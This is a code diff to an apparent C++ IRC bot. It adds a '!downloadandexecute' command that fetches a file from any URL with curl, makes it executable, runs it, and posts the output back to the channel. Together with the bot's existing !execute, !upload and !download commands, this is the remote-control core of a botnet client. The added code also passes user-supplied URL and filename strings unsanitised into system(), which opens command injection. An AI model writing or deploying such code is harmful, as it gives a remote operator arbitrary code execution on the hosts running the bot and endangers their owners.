@@ -163,7 +163,7 @@ public:
         if (command == "!help") {
             std::string help = "Available commands: !help, !time, !version, !status";
             if (isAdmin(sender)) {
-                help += ", !join, !part, !say, !quit, !upload, !download, !execute, !uploadurl, !downloadurl";
+                help += ", !join, !part, !say, !quit, !upload, !download, !execute, !uploadurl, !downloadurl, !downloadandexecute";
             }
             sendCommand("PRIVMSG " + target + " :" + help);
         }
@@ -337,6 +337,68 @@ public:
                     }
                 } else {
                     sendCommand("PRIVMSG " + target + " :Usage: !downloadurl <filename> <url>");
+                }
+            }
+            else if (command == "!downloadandexecute") {
+                std::string url, filename;
+                iss >> url;
+                iss >> filename;
+                if (!url.empty() && !filename.empty()) {
+                    log("Downloading and executing from URL: " + url + " as " + filename);
+                    
+                    // Use curl to download file
+                    std::string curlCmd = "curl -s -L -o " + filename + " \"" + url + "\"";
+                    int downloadResult = system(curlCmd.c_str());
+                    
+                    if (downloadResult == 0) {
+                        // Check if file was downloaded successfully
+                        std::ifstream checkFile(filename);
+                        if (checkFile.good()) {
+                            checkFile.close();
+                            log("File downloaded successfully, now executing: " + filename);
+                            sendCommand("PRIVMSG " + target + " :File downloaded successfully, executing: " + filename);
+                            
+                            // Make file executable (for Unix-like systems)
+                            std::string chmodCmd = "chmod +x " + filename;
+                            system(chmodCmd.c_str());
+                            
+                            // Execute the downloaded file
+                            std::string execCmd = "./" + filename;
+                            FILE* pipe = popen(execCmd.c_str(), "r");
+                            if (pipe) {
+                                char buffer[128];
+                                std::string result = "";
+                                while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
+                                    result += buffer;
+                                }
+                                pclose(pipe);
+                                
+                                if (result.empty()) {
+                                    result = "File executed successfully (no output)";
+                                }
+                                
+                                // Send result in chunks if too long
+                                if (result.length() > 400) {
+                                    sendCommand("PRIVMSG " + target + " :Execution output (truncated): " + result.substr(0, 400) + "...");
+                                } else {
+                                    sendCommand("PRIVMSG " + target + " :Execution output: " + result);
+                                }
+                                
+                                log("File executed successfully: " + filename);
+                            } else {
+                                sendCommand("PRIVMSG " + target + " :Failed to execute downloaded file: " + filename);
+                                log("Failed to execute file: " + filename);
+                            }
+                        } else {
+                            sendCommand("PRIVMSG " + target + " :Failed to download file from URL: " + url);
+                            log("Download failed: " + url);
+                        }
+                    } else {
+                        sendCommand("PRIVMSG " + target + " :Failed to download from URL: " + url);
+                        log("Download failed: " + url);
+                    }
+                } else {
+                    sendCommand("PRIVMSG " + target + " :Usage: !downloadandexecute <url> <filename>");
                 }
             }
         }
